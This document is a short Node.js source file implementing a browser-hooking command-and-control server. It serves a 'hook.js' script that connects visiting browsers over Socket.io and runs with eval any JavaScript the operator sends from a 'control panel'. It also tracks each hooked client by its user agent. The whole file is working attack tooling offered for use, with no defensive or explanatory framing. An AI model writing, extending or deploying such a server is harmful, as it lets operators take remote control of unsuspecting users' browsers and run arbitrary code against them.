const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

// Initialize Express and HTTP Server
const app = express();
const server = http.createServer(app);

// Initialize WebSocket server
const io = new Server(server);

// Serve static files for the control panel
app.use(express.static(path.join(__dirname, 'public')));

// Body parser middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Clients storage
const clients = {};

// Serve the control panel
app.get('/control-panel', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'control-panel.html'));
});

// Hook URL
app.get('/hook.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.send(`
    const socket = io('${req.protocol}://${req.hostname}:${process.env.PORT || 3000}');
    socket.emit('client-connection', { userAgent: navigator.userAgent });
    socket.on('command', (cmd) => {
      eval(cmd); // Execute the command from the control panel
    });
  `);
});

// WebSocket connection handler
io.on('connection', (socket) => {
  console.log(`New client connected: ${socket.id}`);

  // Register new client
  socket.on('client-connection', (data) => {
    clients[socket.id] = { userAgent: data.userAgent };
    io.emit('update-clients', clients); // Update control panel
  });

  // Handle commands from the control panel
  socket.on('send-command', ({ id, command }) => {
    io.to(id).emit('command', command);
  });

  // Disconnect handler
  socket.on('disconnect', () => {
    console.log(`Client disconnected: ${socket.id}`);
    delete clients[socket.id];
    io.emit('update-clients', clients); // Update control panel
  });
});

// Start the server
const PORT = process.env.PORT || 3000;
const LOCAL_IP = '0.0.0.0'; // Bind to all local network interfaces
server.listen(PORT, LOCAL_IP, () => {
  console.log(`Server running at http://${getLocalIPAddress()}:${PORT}`);
});

// Utility to get local IP address
function getLocalIPAddress() {
  const os = require('os');
  const interfaces = os.networkInterfaces();
  for (const interfaceName in interfaces) {
    for (const iface of interfaces[interfaceName]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address;
      }
    }
  }
  return 'localhost';
}
